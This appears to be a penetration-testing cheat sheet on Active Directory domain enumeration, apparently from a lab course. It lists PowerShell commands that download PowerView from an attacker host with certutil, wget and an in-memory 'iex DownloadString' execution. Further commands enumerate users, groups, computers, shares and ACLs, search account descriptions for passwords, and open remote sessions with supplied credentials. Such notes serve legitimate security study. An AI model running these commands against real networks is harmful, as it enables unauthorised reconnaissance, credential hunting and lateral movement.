# Domain Enumeration

* Downloading files with PowerShell:

  ```ps
  certutil.exe -urlcache -f http://192.168.3.28/powerview.ps1 powerview.ps1
  
  wget http://192.168.3.28/powerview.ps1 -OutFile powerview.ps1

  iex (New-Object Net.WebClient).DownloadString('http://192.168.3.28/powerview.ps1')
  # we can use PowerView commands now
  ```

* Further enumeration:

  ```ps
  # using PowerView

  get-netuser
  # enumerating users

  get-netuser | select cn
  # list only names

  get-netuser | select -expandproperty samaccountname
  # list only usernames

  find-userfield -SearchField description "password"
  # search for passwords in account descriptions
  ```

  ```ps
  get-netgroup
  # enumerating groups

  get-netgroup -UserName 's.chisholm'
  # get groups containing user

  get-netgroup -GroupName 'it admins' -FullData
  # enumerating single group
  ```

  ```ps
  get-netcomputer
  # enum domain computers

  get-netcomputer -FullData

  get-netcomputer -OperatingSystem "*Windows 10*"
  # enum domain computers with Win 10 OS

  invoke-sharefinder
  # enum shares

  invoke-sharefinder -ExcludeStandard -ExcludePrint -ExcludeIPC -Verbose

  invoke-filefinder
  # list interesting files
  ```

  ```ps
  Invoke-EnumerateLocalAdmin
  # enumerate local admin users

  get-netgpo
  # enum group policy objects
  ```

  ```ps
  get-objectacl
  # enum ACLs

  get-objectacl -SamAccountName "engineering" -ResolveGUIDs

  get-netdomain
  # enum domain

  get-domainpolicy

  get-domainsid
  ```

* PowerShell remoting:

  ```ps
  # in PowerShell
  Enter-PSSession -ComputerName workstation-02 -Credential mayorsec\themayor
  # we get remote session after entering creds

  # alternative command
  Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName workstation-02 -Credential mayorsec\themayor
  ```
